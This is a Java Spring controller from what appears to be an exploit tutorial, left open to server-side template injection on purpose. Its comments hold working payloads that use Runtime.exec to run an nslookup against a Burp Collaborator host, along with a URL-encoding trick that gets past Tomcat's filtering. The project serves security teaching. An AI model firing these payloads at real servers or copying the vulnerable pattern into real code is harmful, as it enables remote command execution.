package com.jdow.javaexploittutorial.ssti;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

@Controller
@RequestMapping(path = "/api/v1/ssti")
public class SSTIController {

    @GetMapping
    public String sstiGetExample(Model model, @RequestParam(required = false) String message) {
        // Test Payload:
        // http://localhost:8080/api/v1/ssti?message=7*7
        // https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
        // Note: By default, Tomcat blacklists certain characters such as '{}' when sent as query strings
        // This can be bypassed by URL encoding these characters.
        // Test Payload 2:
        // http://localhost:8081/api/v1/ssti?message=$%7BT(java.lang.Runtime).getRuntime().exec(%27nslookup%20blahblahblah.burpcollaborator.net%27)%7D
        Message msg = new Message();
        if (!message.isEmpty()) { msg.setMessage(message); }
        model.addAttribute("msg", msg);
        return "ssti";
    }

    @PostMapping
    public String sstiPostExample(Model model, @RequestBody(required = false) Message message) {
        // Test Payload:
        // {
        //     "message":"${T(java.lang.Runtime).getRuntime().exec('nslookup blahblahblah.burpcollaborator.net')}"
        // }
        model.addAttribute("msg", message);
        return "ssti";
    }
}
